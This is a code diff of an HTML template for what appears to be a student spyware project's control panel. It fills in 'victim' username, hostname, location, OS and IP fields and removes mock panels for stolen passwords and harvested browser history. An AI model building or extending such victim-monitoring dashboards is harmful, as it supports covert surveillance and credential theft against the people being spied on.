@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Device Dashboard</title>
     <link rel="stylesheet" href="/static/overview.css">
 </head>
@@ -14,7 +14,7 @@
                 <div class="avatar">
                     <div class="avatar-icon"></div>
                 </div>
-                <h2>User 1</h2>
+                <h2>{{ victim.username }}</h2>
             </div>
             
             <nav class="sidebar-nav">
@@ -28,7 +28,7 @@
             
             <div class="back-button">
                 <span class="back-icon">↩</span>
-                <span>Back</span>
+                <span><a href="/templates/victim.html">Back</a></span>
             </div>
         </div>
 
@@ -41,8 +41,8 @@
                     <div class="info-card username-card">
                         <div class="card-content">
                             <div>
-                                <div class="label">Username:</div>
-                                <div class="label">Hostname:</div>
+                                <div class="label">Username: {{ victim.username }}</div>
+                                <div class="label">Hostname: {{ victim.hostname }}</div>
                             </div>
                             <div class="card-icon">👤</div>
                         </div>
@@ -51,9 +51,9 @@
                     <div class="info-card location-card">
                         <div class="card-content">
                             <div>
-                                <div class="label">City:</div>
-                                <div class="label">Region:</div>
-                                <div class="label">Country:</div>
+                                <div class="label">City: {{ victim.city }}</div>
+                                <div class="label">Region: {{ victim.region }}</div>
+                                <div class="label">Country: {{ victim.country }}</div>
                             </div>
                             <div class="card-icon">📍</div>
                         </div>
@@ -61,7 +61,7 @@
                     
                     <div class="info-card os-card">
                         <div class="card-content">
-                            <div class="label">Operating System:</div>
+                            <div class="label">Operating System: {{ victim.os }}</div>
                             <div class="card-icon">💻</div>
                         </div>
                     </div>
@@ -69,8 +69,8 @@
                     <div class="info-card ip-card">
                         <div class="card-content">
                             <div>
-                                <div class="label">Local IP:</div>
-                                <div class="label">Public IP:</div>
+                                <div class="label">Local IP: {{ victim.local_ip }}</div>
+                                <div class="label">Public IP: Not Available</div>
                             </div>
                             <div class="card-icon">🌐</div>
                         </div>
@@ -134,59 +134,14 @@
                             </div>
                             <div class="entry-icon">🔒</div>
                         </div>
-                        
-                        <div class="password-entry">
-                            <div class="entry-info">
-                                <div class="url">Url :</div>
-                                <div class="credentials">
-                                    <span>Username : xyz_xyzxyzxyz</span>
-                                    <span>Password : 1234567890</span>
-                                </div>
-                            </div>
-                            <div class="entry-icon">🔒</div>
-                        </div>
                     </div>
                 </section>
             </div>
         </div>
-
-        <!-- Right Sidebar -->
-        <div class="right-sidebar">
-            <section class="browser-history">
-                <h2>History Browser</h2>
-                <div class="browser-info">
-                    <div class="browser-header">
-                        <span class="browser-icon">≡</span>
-                        <span>Google Chrome</span>
-                    </div>
-                    <div class="history-list">
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-item">https://www.canva.com/design/DAGiR3UnX_s/</div>
-                        <div class="history-more">...</div>
-                    </div>
-                </div>
-                
-                <div class="info-notice">
-                    <span class="info-icon">ℹ</span>
-                    <span>To obtain detailed information, select the sidebar now!</span>
-                </div>
-            </section>
-            
-            <img src="/static/image/Logo PBL.png" alt="Spyware Image" class="spyware-image">
-        </div>
     </div>
 
     <script>
-        // Simple chart drawing
+        // Simple chart drawing for network data (example)
         const canvas = document.getElementById('networkChart');
         const ctx = canvas.getContext('2d');
         
